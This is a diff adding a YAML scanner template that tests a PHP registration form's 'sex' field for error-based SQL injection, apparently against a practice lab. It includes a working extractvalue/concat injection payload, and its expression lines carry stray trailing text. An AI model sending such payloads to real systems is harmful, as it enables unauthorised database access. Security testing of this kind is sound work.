@@ -1,0 +1,16 @@
+name: sqli_reg_sex
+rules:
+  - method: POST
+    path: /sqli/sqli_iu/sqli_reg.php
+    follow_redirects: false
+    body: add=JFbTALkdna&email=admin&password=admin&phonenum=admin&sex=JFbTALkdna&submit=submit&username=admin
+    expression: response.status==200 && response.body.bcontains(b'~96043fe8b0c5296dff08996a35d1f60') sqli_reg_sex
+  - method: POST
+    path: /sqli/sqli_iu/sqli_reg.php
+    follow_redirects: false
+    body: add=JFbTALkdna&email=admin&password=admin&phonenum=admin&sex=JFbTALkdna%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2Cmd5%281380337871%29%29%29and%27&submit=submit&username=admin
+    expression: response.status==200 && response.body.bcontains(b'~96043fe8b0c5296dff08996a35d1f60') sqli_reg_sex
+detail:
+  type: sqldet
+  paramkey: sex
+  payload: JFbTALkdna'and/**/extractvalue(1,concat(char(126),md5(1380337871)))and'
